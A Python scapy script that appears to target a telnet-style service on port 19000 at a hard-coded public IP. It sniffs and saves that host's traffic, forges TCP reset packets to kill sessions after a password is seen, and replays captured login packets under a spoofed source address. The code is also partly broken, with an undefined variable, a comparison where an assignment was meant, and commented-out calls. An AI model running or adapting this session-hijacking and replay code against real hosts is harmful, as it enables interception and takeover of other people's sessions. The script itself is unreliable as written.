from struct import pack
from numpy import append
from scapy.all import *

def hijackResponse(p):
    sMAC = p[Ether].dst
    dMAC = p[Ether].src
    sIP = p[IP].dst
    dIP = p[IP].src
    sport = p[IP].dport
    ack = p[TCP].seq + 1
    seq = p[TCP].ack
    r = Ether(src=sMAC, dst=dMAC)/IP(src=sIPm, dst=dIP)/TCP(sport=sport, dport=23, seq=seq, ack=ack, flags="R", options=p[TCP].options)
    sendp(r)

telnetConns = {}
def monitorConnectios(p):
    if (p[TCP].dport == 19000):
        sIP = p[IP].dst
        cIP = p[IP].src
        port = p[TCP].sport
        key = "%s->%s" % (cIP, sIP)
        if not key in telnetConns:
            telnetConns[key] = {}
        if port in telnetConns[key]:
            if p.haslayer(Raw) and p[Raw].load == b"\r\n":
                if telnetConns[key][port] == "p":
                    telnetConns[key][port] == "pass"
    else:
        sIP = p[IP].src
        cIP = p[IP].dst
        port = p[TCP].dport
        key = "%s->%s" % (cIP, sIP)
        if not key in telnetConns:
            telnetConns[key] = {}
        if port in telnetConns[key] and telnetConns[key][port] == "pass":
            hijackResponse(p)

packets = sniff(count=40, filter="host 52.58.164.25 and tcp port 19000") #, prn=monitorConnectios)
packets.summary()

wrpcap("packets.pcap", packets, append = True)

def sendLogin(packets, port):
    numPackets = len(packets)
    for i in range(numPackets):
        packet = packets[i]
        if (packet[IP].dst == "52.58.164.25"):
            packet[IP].src = "192.168.1.9"
            packet[TCP].sport = port
            sendp(packet)
        else:
            response = sniff(count=1, filter="host 52.58.164.25 and tcp port 19000")
            response.summary()        
#a = ""
#while (a!="a"):
#    a= input("Press a to continue")
    #response = sniff(count=2, filter="host 52.58.164.25 and tcp port 19000")

#sendLogin(packets, response[0][TCP].dport)